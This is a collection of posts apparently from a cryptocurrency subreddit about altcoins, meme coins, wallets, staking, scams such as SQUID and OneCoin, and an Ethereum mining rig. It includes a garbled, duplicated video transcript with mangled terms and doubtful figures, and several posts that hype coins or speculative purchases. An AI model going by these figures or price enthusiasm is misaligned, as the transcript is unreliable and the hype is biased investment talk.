I ask because as I say, those of us within crypto are aware of the news and stuff, but for friends who have no crypto whatsoever, or have only very lightly dipped their toes in, they don't see any news/know nothing about crypto. 

I arrived here in March and I wish I'd been in years ago (don't we all) but I'm just looking to learn more of is it just part of the end of the cycle. Everyone expects crypto to go mainstream because we know the benefits, and then the bear market arrives and all hype dies. 

Also, how are *you* personally feeling this time in comparison to last time? DO you feel this is the end of the bull market, or like some do you feel that we're merely mid-way through? 

Cheers!

So Ive been investing in crypto for a couple of years (bitcoin), after the recent bull run and doing research Ive been looking into and starting to buy into some Altcoins (AMP, ALGO, LINK).


It feels like every time I try and do some DD on another coin or token the analysis is buyest and the person analysing is holding a bag and giving ridiculous price predictions, likewise on Reddit. Most coins in the top 50 which i research Im like wow this shit is game changing but obviously they all cant make it. 



Basically what Im saying is Im not rich enough to spread my chips across the top 50, does anyone have any YouTube channels or people who analyse projects unbiased so I can make my own mind up if I feel like this is the one. 

Thanks guys

Hi,

After this sub became a bubble full of meme coin shilling and Fomo and looking for the next x1000 coin, a lot of people are upset that their coins didnt went x100 the last weeks.

Just look at BTC and ETH, they have reached ATH!

The biggest altcoins made some nice runs, the market is very bullish.

And if that is not enough for you, just take a look at the common stocks.. besides TSLA its hard to get 20% in a few months, so when you zoom out the charts of your beatiful coins, you will see you outperformed the most stocks.

Just lay back, enjoy the new ATHs of BTC and ETH, and the more people talk about crypto in the media, the more will start to invest.

Dont Fomo into memecoins, enjoy your 10-100% profits and crack open a cold one.

This is gonna be so textbook-ish, I am sorry you have to read it. But crypto investing behaviour is rather worrying, enough to make me think that some people don't even have that simple basic idea.

I think people need to educate themselves regarding crypto problems and existing projects that are trying to solve real problems.

I am all in for Celer Network, and there are many others that have similarly good objectives and goals too. I think they are the ones that deserve the attentions.

Ah, yes, 'meme coins have utility too', you may argue. So, now the question becomes, how do we know if the claims made by many meme-ish projects are real? Every crypto developers can start to talk about 'social experiment' etc, how do we even verify it? SQUID coin just pulled off a scam, it seemed, and this is the kind of thing we don't need in crypto.

Now, having the government step in to impose regulations can really be stifling to new technology. Why can't they step just in an effective yet *minimal* fashion. Like, just make sure people who are building a crypto project is at least identified? Simple as that, id verification, business registration, whatever. Make it fast and easy to do, but most importantly, without needing to check every single aspect of the white paper or all the sub-objectives of the project, just get the official public list of people actively involved in the project? At least, when rug-pull occurred, some people can be investigated. If it is really so hard, tell me why.

ps, if meme coin makes people richer, and then they use it to invest in a good project, I guess that is okay too?

Here's a hypothetical situation, correct me in the comments if I'm wrong:

Many people invested huge sums into Shiba Inu and became Whales. 

When Shiba skyrocketed due to the hype, the Whales could never sell all at once, if they did, the market would feel something is wrong and Shiba's price would plummet hard.

So that's something the Whales couldn't have done. 

Instead they must cash out on small amounts over the span of days, weeks and months to collect back their fortune.

But the issue is, will Shiba be able to remain at its valuable price of an ALT over the course of weeks and months?

No, it's volatile. Thus these same Whales and other people that jumped on the bandwagon are now trying to maintain the hype so that the demand in the market is maintained as well. 

Just because someone's investments skyrocketed does not mean they have that much money in cash to buy a Lamborghini.

Wow! Im relatively new to the crypto space, the lowest price I bought at was roughly 1700 back in Spring. Only half a year later, we put in an ATH significantly higher than what many thought was the market cycle top - but clearly it wasnt, and were getting ready for another run that will hopefully be not overly aggressive so that it can extend into 2022. Ethereum has such great-risk adjusted returns!

Next step: $5000, then 5000

Hello  fellow cryptocurrencians. sorry to bother you again but once again i ask for your support:)  


If I remember correctly, there was a post here  before that some fella summarized the white papers of top coins and ranked them based on if they were informative or not. if i remember correctly Shiba was surprisingly ranked good and Doge was bad or something like that. i don't care about Shiba or Doge right now i want to see that table again to get some ideas (actually to help out a friend).

so for some reasons I need to see that post again and I couldn't find it. So if you by any chance saved it I'd appreciate the link. and if its OP reads this and send me the link that would be great.

actually i could say all of that in 1 sentence, but you know how it is. and sorry if i speak gibberish.

Thanks in advance guys.

Soo, since more and more shops and whatnot who accept this or that new Crypto are popping up, is there not some form of card reader/payment gadget out there which accepts all cryptos at once like on an exchange? I mean that would actually be usefull, just using whatever crypto for payment over an easy to use app e. g., but I don't know If any company ist planning on doing that, or if that would even be profitable. What do you think, would a concept like this work and bei profitable for the company? Obv. they can't just put every crypto in existence in there but maybe top100.

I currently hold all my crypto on my crypto.com app. I'm currently holding BTC and ETH as my main investments. I also have in my portfolio small amounts of ADA, HOT, XRP and XLM. What are the risks of keeping it there? If I'm considering holding all my crypto long term would it be better to keep my crypto in a cold wallet? If so, what cold wallet would you all recommend to purchase?

I think my biggest fear of leaving all my crypto on the crypto.com app is having the company go under and losing all my investments.

A win/win if tou ask me lol.... a true coin disguised as a meme coin... every *wen moon boi* will invest in anything animal this days and BAT is a cool name the only thing missing is the logo.

I mean, the more silly the project sound the more people will get into it this days, the should try it... I mean, I need to get rich soon with my 8 BAT lol.

And also change the logo of the brave browser from the lion to a bat, I can assure you this project will moon no time.

Hello everybody!

I have some money I've saved up over a few months and I'm looking to get into projects that have a high reward-to-risk ratio. I already hold BTC, ETH and blue chip alts like ADA, ALGO and BNB. I also hold a few fundamentally strong projects like BOG, FLOW and HOT, all of which I am pretty bullish on.

It'd be great if you guys can recommend me some projects with innovative fundamentals and usecases. It would also be a big plus if they have small marketcaps like BOG. I would also like it if these projects are involved in recent crypto and world trends such as NFTs, DeFi, Metaverse, Web 3.0, Layer 2 Scaling and such.

Thank you in advance!

Some guys broke into the house of the founder of Tuenti, a very popular social network back in the day when FB was starting as well in Spain, and they tortured him for hours with electric shocks and cutting him with a knife.

He eventually gave up his passwords and they took laptops,tables and pendrive from him. He lost dozens of millions of  euros worth of BTC

I had a strange feeling to go YOLO few days ago. Im already holding ETH/BTC/ADA for several months and its going well. I decided to move some move fiat into the market and had this strange urge to take some risks. I did research on so many different projects, each one claim to be the one, which can be true in some cases but I felt like investing my bar mitzvah savings on a serious project might get me x2/x3 which wont be life changing for me. So I decided to go with my feelings. 

ELON is not even on the top 100 list on CoinGecko. The trading volume is pretty high and it seems like people who invested in shiba/dogecoin/squid/ are looking for an alternative memecoin. ELON might be one of those choices.

It's obvious that in a few months time or much shorter, the particular set of coins can do 10x just because that type od coins are trending. Right now it's shibas, cats and metaverse/gaming. Or something which has all of that combined in a name + elon and moon 

What in your opinion are the signs that the trend is slowing down and about to reverse? Do you FOMO in, just to get a quick buck?

I mean, how on earth did that squid project get Billions in!? I didn't realize there's so much dumb money around..
I personally believe that throwing 10$ into a micro low cap coin on pancakeswap or wherever ain't a bad idea, regarding the market situation and upside potential. 

Also, what do you think will be the next trend? Smart platforms? sound crypto currencies? Defi? Defi insurance?

I did a lot of research about the Gala Project and there concept with the nodes. Gala should be the next Steam in blockchain. The game Town Star is currently running, which is not exactly a hit with for most of the users. But it doesn't have to mean that the next games will also be a flop like Mirandus. The next Point is that they using right now ETH with huge fees, but they wil launching their own smartchain with lees fees.

Gala is created by the Zynga cofounder and Zynga is a huge Company with more then 1.9B sales in 2020. The mcap of Gala is now : $682,848,570

Well, what is interesting for me, the node is currently paid out over 380 coins every day and as soon as the first 50K nodes are sold the rewards are around 170 coins every day.

Currently means every day: 170 x 0.09 = 15.3 $. However, if the price goes up there is more money each day. The disadvantage of such a node currently costs 27K.

I break my head now xD of thinking about whether I should buy one or not.

When Gala makes 5X like the price is : 0.45$ and it will stay for 1 Year i have my Roi.

What do you think about that ?

You all will probably hate me but im planning on swapping my moons out for xlm and then converting that to algo so i can add to the Tinyman liquidity pool for Yieldly/Algo. I love the Tinyman platform and plan on supporting it for years to come. I have no plans on pulling out any of my liquidity or taking profits until it can actually change my life for the better. Before you comment, no i am not putting all my eggs in the Algorand basket, even though it is very tempting and promising. I am heavily skewed towards Algorand because i believe in a lot of its ASAs and its spot in the Defi/dapps arena. To wrap it up, i will most likely keep some moons in my vault for the 20% bonus and to obviously support CCs amazing coin.

Would like to understand the general consensus on what you guys thinking we are currently at in the cryptocurrency world. Are we in the 1992 Internet era where majority of people do not know any about the internet yet and way before the dot com was created?

Even though we rarely hear anyone talking about Crypto at all and many banks are pessimistic on the outlook of it, where do you guys see us right now compared to the rest of the world.

Personally I feel that we are approaching the era of dot.com soon whereby people are starting to realise the potential of what crypto can become.

Sooner or later, schools will be teaching about blockchain technology and how crypto has reshape the world.

What are your thoughts ?

 Digital mining is kind of like real life mining,except that instead of shovels and dynamite, it's accomplished with software and computers.A miner is essentially just running a computer program that solves a complex math problem.Solving that math problem is how crypto transactions are verified so that money correctly

moves from A to B.

The miner who solves the problem first is awardedcrypto cash by the algorithm for their bookkeeping efforts. In the 12 years of history, not a single entry on its block chain has been fraudulent.Now they processed probably close to 10 trillion dollars of transactions and not a single false entry in the, you know, that same 12 year period

of time. What percent of banking system activity was

false? It's probably close to seven or eight percent to achieve that kind of security while being completely permissionless. Anyone can actually transact on this.

I mean, that's a pretty incredible feat.

**CONVERSATION**

Can you explain to me what we're looking at right

now?

So this is an Ethereum mining rig, and this is just like any other computer that you would build on your own only instead of having an actual case that all the components live in.

It's in an open area like this.

And you need to do this because when the GPs are running, they get really hot and it's important to have like a lot of air circulation. Lee learned how to mine watching YouTube videos.

This is back when he was still mining in his

spare time.And so the main components here, this is your

power supply.This is your motherboard.

This is what wires up all the logic on the

computer.You need to have an operating system running on

your motherboard.

And so this is an SSD, isolated, hard drive.And I have a specific operating system called FOS installed on this.This is an Nvidia Gforce GTX 1080 GPU. And this is a graphics card that people use mostly for gaming.But these are also really good for mining crypto currencies.Once this is sewed into place, we need to plug it into the power supply. And then we need to plug in the data so that graphics card can read from the computer and then plug this guy in.

So what's this last plug here?

So this is a SATA cable.

This is so that I can get data out of the

motherboard.

So once it's all wired up like that, this is ready

to go.We can just turn it on and we'll start mining.

You just turn the computer into a rig. A mining rig. Yes.All in this rig cost roughly 1400 dollars because

of the parts that you see here.The only other thing left to do is create a wallet, a wallet is a digital address for crypto cash, and then how long does it take for it to actually start minings?

&amp;#x200B;

This should just automatically start connect to the network and knows your address.You'll see it start going in a couple of minutes. When the rig is mining, what it's actually doing

is running what's called a hashing algorithm.So it's computing millions of math equations to work out all those digital transactions.

But this mining rig isn't doing all these math

problems in a vacuum.It's actually competing against miners all overthe planet to be the first person to verify a block of transactions.Someone wins this race roughly once every 13 seconds, and whoever wins is awarded to ether.They also get a transaction fee, which averages out to about 2.3 ether.But there's a mining pool fee that has to be paid, which is about one percent of the block

price plus the transaction fee.When you combine all three at today's prices, that comes out to about sixty four hundred dollars. 

And is everyone using the same hashing

algorithm?

Everyone uses the same hashing algorithm.

It's completely democratic.

It just depends on the hardware that you have and

the cost of your electricity.So the only advantage you would have is if your GPU runs faster than someone else's or your electricity is cheaper.Yeah there's no way to shorten to shortcut it.This rig with only one graphics card can run roughly twenty seven million math equations every second. 

That sounds like a lot, right?

But on the theorems network right now, there's

400 trillion math operations happening every

second. So Lee's rig in Brooklyn accounts for

around one 15 millionth of the entire Ethereum

network. That's why people join something called

a mining pool.A pool lets a single miner combine their hashing

power with thousands of other miners all over the

world. They could be in Afghanistan.

They could be in Dubai.They could be in Europe or South America.

You're all sharing your resources together and it

doesn't matter where you're physically located.So you are working together with these people to compete to solve a block faster than anybody else.

It's one giant competition between everyone that's

on the network.

So it's a race between you and your computers and

the computers in your mining pool versus the

computers and other mining pools.

let's fast forward an hour teaming up with my

mining pool.Here's how much I managed to rake in as a miner.

OK, so is it actually worth it to spend all this

money on gear and electricity in order to mine for

crypto coins? Let's look at the map.Our one graphics card rig costs roughly fourteen

hundred dollars.Tack on five more graphics cards and we're forty

four hundred.If we run this rig at full capacity with all six

GPUs, it can earn about 0.348 either per month,

which is roughly five hundred and fifty dollars.These rigs require quite a bit of power.

So electricity cost is a big factor.

Where you live in the United States also plays a

major role and how much it cost to mine.Since there are stark differences in electricity

prices from state to state, Alaska, Hawaii,

California and Connecticut have the steepest

electricity costs in the country.

New York is also one of the priciest states where

electricity bills are concerned.So it doesn't necessarily make sense to mine here

in New York.But it's a totally different story where

electricity is less expensive.

Just take Washington State.It's got some of the cheapest power sources in

the U.S.

So there the profits can outweigh the costs.Outside the US, the prices drop even lower.

A study released in twenty eighteen by Elite

fixtures show the countries like Egypt and Kuwait

are among the places where it is least expensive

to mine for Bitcoin.But one important thing to keep in mind is that

the size of the prize that miners win

exponentially decreases over time, back in 2017,

it was five ether, but it's been cut down a few

times since then. Rewards are now 2 ether.

But again, you get a transaction fee for each

completed block and those fees, something they

call gas prices, keep going up.

So there's definitely still money in mining for

Ethereum.And unlike Bitcoin, there's no cap on the total

number of ether coins you can find.

The supply is endless.

FOMOing is bad, most of us know and believe that. Heck, I bet that even most of us has FOMOed into a coin and it ended really bad for them, and that is how they learned their lesson.

But I also understand the brain when seeing a green dildo going to the moon and beyond telling you the next few candles will look exactly the same so you should buy! I try to take myself outside when my brain starts acting up but I'm sure some of you did FOMO and it ended (very) well for them. 

&amp;#x200B;

My question is, into which coin did you FOMO and how well did it end?

Hello

&amp;#x200B;

I did a lot of research about the Gala Project and there concept with the nodes.  Gala should be the next Steam in blockchain. The game Town Star is currently running, which is not exactly a hit with for most of the users. But it doesn't have to mean that the next games will also be a flop like Mirandus.  

Gala is created by the Zynga cofounder and Zynga is a huge Company with more then 1.9B sales in 2020. The mcap of Gala is now :  $682,848,570

Well, what is interesting for me, the node is currently paid out over 380 coins every day and as soon as the first 50K nodes are sold the rewards are around 170 coins every day. 

Currently means every day: 170 x 0.09 = 15.3 $. However, if the price goes up there is more money each day. The disadvantage of such a node currently costs 27K. 

 I break my head now xD of thinking about whether I should buy one or not. 

When Gala makes 5X like the price is : 0.45$ and it will stay for 1 Year i have my Roi.

What do you think about that ? 

Thanky very much!!

TRAC has been one of my long term holdings, seeing as I bought it first at $0.04 in 2019. I saw it pump up to $0.8 in May, then plummet down with the rest of the market. I sold all of it, with a solid profit, promising myself to buy it again when the market shows signs of recovery. I forgot to buy it when the market recovered.   

For the last few week(s), TRAC has been making gains here and there. People assumed it was because of Coinbase listing, you know, buy the rumor, sell the news type of thing. I bought some, admittedly a bit late, but hey, one cannot time the market. 

So yesterday I see a small price movement. It was crabbing all day long. Then, all of a sudden, there's a major price pump. The Coinbase listing went live. And it got off the rails fast and soon. Price went from $1.2 to $4.5 (on Coinbase). I tried to do some arbitrage trading, as the price on Kucoin was around $2.4 ATT. But I failed. I was worried I would not be able to sell on Coinbase, or that the bots will be doing their own thing, leaving me with withdrawal fees. And withdrawal fees were absurd for TRAC (around 40 TRAC for a simple withdrawal) . I went to bed, expecting the price to settle down at around $1.7-1.8. But it's still relatively high, and the price has not "calmed" down, as we're seeing current price at around $2.4 with a 100% pump in the last 24hrs. 

The difference between the price has gone, so no arbitrage opportunity anymore. 

You know what the best thing is? TRAC is still not a top 100 crypto. Mcap hovers around 800M. There's still so much room to grow IMO.

Is FTM &amp;amp; ONE OLD old news?

I was just wondering what happened to all the hype around ONE and FTM? Just 1-2 weeks ago there was ONE &amp;amp; FTM posts everywere and they pumped like crazy, and now all of a sudden its all silent. What happened? was it just a fad. Om not trying to re-shill them. Im honestly just curious. Any thoughts on this?

Since everything is visible on the chain, shouldnt we be able to trace who the scammers are?

1) When they first deposited the amount to create the liquidity pool, shouldnt we be able to trace which wallet that came from? The SQUID tokens might be generated by them, but we should be able to trace where they acquired the BNB from right? Thats the first clue.

2) When they try to exit, they will now have BNB and they will also have to somehow cash that out. They may use multiple wallets in between to try to dust their tracks, but we can still follow the trial to the end which should end up in some off-ramp mechanism where they change crypto to fiat. Thats the second clue.

The crypto transfers may not be reversible, but if we can nab the scammers, we can at least have them return the money (even if partially).

What am I missing here?

Hey all, I was just wondering what wallets everyone uses.

I did some research when I first got into crypto, and came up with my personal strategy. I decided I would temporarily hold my crypto on exchange until I picked and set up some hot wallets, and then down the line (maybe when I accumulated a significant amount) switch to cold wallets like ledger. But Im thinking of just going to ledger because Im ending up with a bunch of different hot wallets for specific crypto. At first I was only invested in a few coins, but that has diversified over time. I want to own my keys and also be somewhat secure. Think I should just go hardware at this point? And if you do use hardware, do you still have to use a hot wallet for certain coins that arent supported yet?

Good day.  So in the last 365 days I've made some bad trades, turned down millionaire making opportunity and now just breaking even. I'm trying to get into the mentally of it is was it is and move on but every time I check my coingecko I'm reminded of what I lost and what could have been. What do I do to move past it. 

On the other hand I wonder what would happen to me as a person if I had made all that money. Whether I would still want to persue the career I'm on, would I have been more arrogant or lavish with my spending.

Also if you don't mind coins for the end of the year ?

My reasoning is simple. 90% of investors in the cryptos sphere are driven by pure greed &amp; ultra ignorance.   
If there has been a success with two doggos coins, do you guys think there would be another run and bump with a cat coins?

Just read this about onecoins scammer over at bbc. How these shitbags can sleep at night is beyond me. 

[https://www.bbc.co.uk/news/stories-59062959](https://www.bbc.co.uk/news/stories-59062959)

A money-laundering trial in Germany is shining a light on the purchase of a luxury London penthouse by cryptocurrency scammer Dr Ruja Ignatova. Jamie Bartlett and Rob Byrne of The Missing Cryptoqueen podcast explain how she used British-based lawyers and wealth managers - who continued to offer their services after she disappeared.

&amp;#x200B;

A former porter at the exclusive Abbots House apartment block in Kensington remembers meeting Dr Ruja Ignatova in 2016, as she returned from a shopping trip with her Bulgarian bodyguards.

&amp;#x200B;

"These two poor men came behind her like overloaded donkeys, struggling, and a bit out of breath - they must've had 20 bags each," says James (not his real name).

Dr Ruja had been splashing out on designer-label goods - Jimmy Choo, Prada, and Calvin Klein - without regard for the expense.

A little later, James got a look inside her four-bedroom penthouse flat, complete with swimming pool.

"She had an Andy Warhol painting stuffed in the cupboard, and that broke my heart because I went to art college," says the ex-policeman.

That was a print of the actress, Elizabeth Taylor. Another Warhol, Red Lenin, hung above the fireplace. To the left of a sofa in another reception room was a print of Queen Bubblegum by Michael Moebius, showing Queen Elizabeth blowing a bubble.

Private Eye later estimated the flat contained works of art worth 500,000, bought from London's Halcyon gallery.

James wondered whether Dr Ignatova was deliberately spreading her suspect wealth into assets that could be easily moved, to avoid them being seized.

Short presentational grey line

On 17 September Dr Ruja's German lawyer, Martin Breidenbach, went on trial in Mnster, accused of money laundering for transferring 20 million euros to a London law firm to fund the purchase of the luxury property.

Two others are also in the dock, facing charges connected to the siphoning of millions of euros from Dr Ruja's 4bn scam - which consisted of selling something that didn't exist, a fake cryptocurrency she called OneCoin.

When the lease was signed in August 2016, financial regulators in at least one European country had already issued a warning about OneCoin. A few months earlier, Dr Ruja had pleaded guilty to fraud and other charges in a German court, after bankrupting a metal factory she'd bought and leaving 150 people jobless in 2011.

But this wasn't widely known.

Lawyers at Locke Lord, a US law firm with an office in London, did express concern about the source of the 20 million euros being transferred - this is apparent from internal emails revealed later in a US court case. But Dr Ruja's companies passed the firm's compliance checks, so they proceeded with the purchase of the property, along with Aquitaine Group, a Guernsey company offering tax haven services to wealthy clients.

&amp;#x200B;

The penthouse had been refurbished by luxury property developers Candy &amp; Candy after a fire that broke out while it was the London home of the singer, Duffy. The estate agent was Knight Frank. But quite who had bought the flat remained unclear to the outside world, thanks to British tax haven secrecy.

According to the property deed its owner is Abbots House Penthouse Limited.

This is an anonymous Guernsey shell company - one of 12,000 such companies that own properties in England and Wales - meaning that Dr Ruja's name would not have to appear on the UK deed, or in public records in the Channel Island.

Other Guernsey firms were appointed as directors (or "nominees"), and a couple of months after Dr Ruja's offer was accepted, Aquitaine was listed as the company's "resident agent" in Guernsey. The London address of Locke Lord, meanwhile, appeared on the penthouse's Land Registry documents.

This appears to have been enough to conceal Dr Ruja's purchase of the property from the City of London Police, which told swindled OneCoin investors in September 2019 that they were "unable to identify any OneCoin assets in the UK".

The truth was only revealed two months later, in emails read out in the money-laundering trial of a former Locke Lord employee in the US, Mark Scott.

There are too many posts about what 'real' value NFTs hold right now apart from weird pixelated pictures of smoking apes. These posts ignore the silent proliferation of NFTs happening in the gaming and play-to-earn space. 

Gods Unchained is one of the many play-to-earn games I've tried, including Axie, Plants vs Undead, Berserk, Splinterlands, those horce racing games etc., but all of them either don't feel like games and more like mining simulators - where you just let something like a plant generate yields - or have teams that don't care about improving the NFT experience. I did stick to Gods Unchained, however, and it has not dissapointed me in either returns or fun had.

Currently, Gods Unchained exists as a TCG games like Magic The Gathering and Hearthstone, with a marketplace on Ethereum's layer 2 - Immutable, which has a TikTok partnership, too - where cards you play with are bought or sold. For the gameplay, you'd have to know how these games work before you decide to get into it, as it's not for everyone, but if you enjoy these games and collecting your own decks this maybe for you.

You've to build decks and play with one of six gods with their own powers specific playstyles, and the game currently has two ways of generating money. You can play on the weekends and compete for weekend rewards, based on how many games you win out of your first 25. The rewards are currently packs from the current set on sale - Divine Order - though it would change when they run out of the pack supply.

https://blog.godsunchained.com/2021/03/19/play-to-earn-with-weekend-ranked/

Ideally, you get money to play, too, as the free to play cards you get can be forged (you need 2 of the same card to forge) into NFTs, but the forge is shut right now due to high ethereum fees.

The other way is their new Gods token, which could be earned by playing the ongoing Blessing of the Gods event, which rewards playing and winning through the week, The Gods token is currently $5.70 on CMC and on the rise, and if it could reach the popularity of Axie - one can only imagine. 

https://blog.godsunchained.com/2021/10/29/blessing-of-the-gods/

A good part of the game is that you don't need to focus on returns - it's fun to play, too. I collect cards to play, and all of them have only gone up over time. Card holders also got an airdrop of about 760 Gods, which is only a part of the total airdrop they're getting. With the card's value going up consistently and the airdrops, the game hasn't yet disappointed its long term supporters. 

The game itself, however, is tough to master, and you'd have to get good to get consistent returns on the weekend, as the higher valued legendary cards are quite high on the Immutable marketplace (could be accessed via TokenTrove, too). 

All in all, it's a game I massively enjoy both for collecting and seeing the value of my deck go up as well as playing the game and getting better against opponents with expensive, legendary decks. Many people with free decks earn a lot of money on the weekends, but it's difficult. 

This is not affiliated with Gods Unchained in anyway, the token really just launched and until the Divine Order set was released recently, most players weren't earning anything real until recently. The profits are meagre or non existent for maybe months, and it's entirely possible that you naturally suck at this type of games. Though as a game, it totally works. And the prices of the genesis set have only gone up (could be confirmed on Token Trove).

Hi everyone, 

Hope you all are well. Please let me know if this isnt allowed and Ill remove the post. 

Basically Im need to crypto with regards to investing etc. I know a lot of research has to be put behind the scenes to be successful or limit your risks. My question is, what are the best tools with regards to learning about crypto, understanding it and then being able to apply it. Any books, videos, websites? If you would be kind enough to recommend anything it would be greatly appreciated. 

Thank you. Stay safe, stay blessed

Digital mining is kind of like real life mining,

except that instead of shovels and dynamite, it's

accomplished with software and computers.

A miner is essentially just running a computer

program that solves a complex math problem.

Solving that math problem is how crypto

transactions are verified so that money correctly

moves from A to B.

The miner who solves the problem first is awarded

crypto cash by the algorithm for their bookkeeping

efforts. In the 12 years of history, not a single

entry on its block chain has been fraudulent.

Now they processed probably close to 10 trillion

dollars of transactions and not a single false

entry in the, you know, that same 12 year period

of time.

What percent of banking system activity was

false?

It's probably close to seven or eight percent to

achieve that kind of security while being

completely permissionless.

Anyone can actually transact on this.

I mean, that's a pretty incredible feat.

&amp;#x200B;

CONVERSATION 

Can you explain to me what we're looking at right

now?

So this is an Ethereum mining rig, and this is

just like any other computer that you would build

on your own only instead of having an actual case

that all the components live in.

It's in an open area like this.

And you need to do this because when the GPs are

running, they get really hot and it's important to

have like a lot of air circulation.

Lee learned how to mine watching YouTube videos.

This is back when he was still mining in his

spare time.

And so the main components here, this is your

power supply.

This is your motherboard.

This is what wires up all the logic on the

computer.

You need to have an operating system running on

your motherboard.

And so this is an SSD, isolated, hard drive.

And I have a specific operating system called FOS

installed on this.

This is an Nvidia Gforce GTX 1080 GPU.

And this is a graphics card that people use

mostly for gaming.

But these are also really good for mining crypto

currencies.

Once this is sewed into place, we need to plug it

into the power supply.

And then we need to plug in the data so that

graphics card can read from the computer

and then plug this guy in.

So what's this last plug here?

So this is a SATA cable.

This is so that I can get data out of the

motherboard.

So once it's all wired up like that, this is ready

to go.

We can just turn it on and we'll start mining.

You just turn the computer into a rig.

You'll see it start going in a couple of minutes.

When the rig is mining, what it's actually doing

is running what's called a hashing algorithm.

So it's computing millions of math equations to

work out all those digital transactions.

But this mining rig isn't doing all these math

problems in a vacuum.

It's actually competing against miners all over

the planet to be the first person to verify a

block of transactions.

Someone wins this race roughly once every 13

seconds, and whoever wins is awarded to ether.

They also get a transaction fee, which averages

out to about 2.3 ether.

But there's a mining pool fee that has to be

paid, which is about one percent of the block

price plus the transaction fee.

When you combine all three at today's prices,

that comes out to about sixty four hundred

dollars. And is everyone using the same hashing

algorithm?

Everyone uses the same hashing algorithm.

It's completely democratic.

It just depends on the hardware that you have and

the cost of your electricity.

So the only advantage you would have is if your

But on the theorems network right now, there's

400 trillion math operations happening every

around one 15 millionth of the entire Ethereum

network. That's why people join something called

a mining pool.

A pool lets a single miner combine their hashing

power with thousands of other miners all over the

world. They could be in Afghanistan.

They could be in Dubai.

You may have noticed that the modern form and structure of lending consists of a lending platform that earns interest from borrowers and distributes it among lenders. Suprisingly, there is no lending platform that provides zero-interest loan but takes a commission from borrowers. 
Although, not entirely a lensing based method, e-commerce systems like Uber, eBay, Amazon, Airbnb etc. are some great examples that works perfectly on the commission-based model. 
Why not applying this principle to solely lending platforms through the harnessing of blockchain technology? Instead of fixed or variable interest, this new model will let people borrow token(s) and move token(s) into a auto-created crypto fund with single token(s) and trade it in whatever form they desire: swap it, stake it, but/sell any token. 
If the borrower makes money, then the lending platform takes a share and like e-commerce platforms: no profit will result in no commission. It is that simple. No complex interest calculations, no hidden fees, and no payment dates! What do yo think about this platform?

I still have to buy another hardware wallet. This time I want to buy a ledger nano s so I can connect it to metamask. I have found another meme coin and I have to be quick before it explodes. I have already seen press. I still have to get the nano ledger s. Is it possible to buy the tokens with metamask and connect the metamask wallet with the ledger nano s later? Or should I do this in the beginning when making the metamask wallet? 


Another question: I can only get this coin on uniswap. It is only tradable with WETH. How can I get WETH? I know it is wrapped ETH, but should I then send ETH to metamask and make it WETH? Is that also going to cost fees? How should I go about this?

Any advice appreciated

Hey Guys, sorry for the dumb question but I am wondering what I should do. The other day I sent BEP20 to MetaMask. After sometime I finally figured out how to see the BEP20 token by adding a custom network. And now I see my BEP20. Now Im trying to figure out how to send it back to my trust account. My MetaMask account doesnt have any bnb and Im trying to figure out how they heck Im going to able to send it without paying for gas. Should I send bnb from my trust wallet to MetaMask that way I can pay for gas or? Thanks for the help!

The thought just crossed my head and was wondering why cant everyone just hold or buy crypto or anything and just not sell at all if you do not need the money right now?

Why cant everyone just keep buying and not sell it at all. This would definitely increase the price and no one will get hurt in the process. 

Since most of the time, this are money that we would not be using for awhile, wont it be good if we just buy and accumulate more and more instead of just shorting it?

Maybe I do not really understand the economics behind it but if everyone were to just buy and accumulating, the price will only keep going up.

Am I wrong on this? Please explain like Im a complete noob as I thought this was an obvious way to make money for everyone..

Ive seen many people complaining in the past days about the crab market, the fact that the prices arent that much of changing and are keeping going sideways, but you should put things in perspective and think about the Tether USDT holders before complaining.

Here are the USDT prices throughout the past years :

June 7th, 2018 : $1

January 23th, 2019: $1

April 13rd, 2021: $0.9977 (bear market was wild)

August 11th, 2021 : $1.0014 (bull run pump!)

Today, Nov 3rd 2021 : $1

See, USDT is a hidden gem that has been consolidating for more than 5 years, so dont complain if your coins are going sideways for a few days!

And to my fellow USDT hodlers, keep hodling, your time will shine!

Tether to the moon!

Being nice to newcomers in crypto isn't just being a good person but it also benefits us whole as a community. 

Would you want to join a group of degens who flame you for everything you ask and do? If newbies do a poor choice of coin to invest into, I kindly tell them that maybe it's not the most solid move they did but Im not going to flame them or point our their mistake. If you believe in SHIB good for you. If you believe in ADA or whatever,  good for you. But it doesn't matter.

What it really matters is massive mainstream adoption. That's where we need to hold our hands and be one. That's where we need to focus our all efforts. To push crypto even further than it's now. It will benefit us all, regardless of the crypto you own.

DO NOT SHARE HOW MUCH CRYPTO YOU OWN.

I mean talking only percentage wise.

For example, I day trade with 80% of my portfolio and the other 20% are just there.

I'm wondering if this is really the right thing to do.

Should I stake? Which coins are you Staking and which you just HODL? 

Should I use less to trade?

**How is your crypto portfolio divided?**
I think it could benefit everyone to get some perspective.

(I'm just curious, don't take anything in this thread as financial advice and don't make any drastic changes in your portfolio suddenly).

Its unfortunate that even being a centralized chain they do not try to stop or avoid scams.

I invest in coins on bsc because eth fees are high and other blockchains investment process is just too difficult. Do we have some straight forward resources for investors:

&amp;#x200B;

1. DOT Para chains and auctions are cool but I don't want to lock my investment for 20,30 or 40 weeks. how can in invest in projects coming on DOT without locking my crypto?
2. I have seen  ***charles*** hoskinson interview with lex fridman and I think peer reviewing updates before implementing is the right approach; but how would I invest in new tokens in ADA?

&amp;#x200B;

BSC has given me 9x and 4x on an average day but its getting harder and harder to spot good projects and i need to move to other ecosystems as i have chosen to do this full time. Please educate me on this.

Hi everyone

I am new to crypto (around a month) and have some questions about staking. I have some funds on Coinbase that are staking (algo) and that all seems easy. The APYs on binance, where I have some coins, are good but they almost seem too good to be true. There is also a difference between the earn section and staking so am curious about that. Mostly I am worried that I risk losing my investment but with some reading it appears that staking is risk-free?

Also whenever I google binance there seems to be a lot of hate towards them. People say to move off an exchange after purchasing but with DCA in and high gas fees it doesnt seem economical. Am I missing something?

 J.P. Morgan thinks that Bitcoins fair price is $35k. The bank has recently put out this statement even after knowing that the current price of BTC is nearly $63k. The price that J.P. Morgan has quoted is a lot less than what BTC is trading at right now. But they also said that even though this is the fair price, they expect to outperform it and have also given a price target of more than $73k in the short term. 

Well me as a person only started investing into crypto in April and kept accumulating in when Bitcoin went below 30K. But I think J.P Morgan didn't believe $30K was a good entry point back then and were waiting for it to reduce further only to be surprised to see it bounce back. 

Now when BTC is $63K they are realizing their mistake and want to create FUD so they can get in at a lower price. 

**Also saying Bitcoins fair price is $35k as well as that BTC will reach $73K in short term in the same analysis only shows that they don't know what's happening and only crying grapes are sour as they think they didn't get in earlier.**

In 2017 Request Network (REQ) was commonly shilled on this subreddit and one of the up and coming tokens to invest in. After the 2018 crash it seemed to quietly fade into obscurity. 

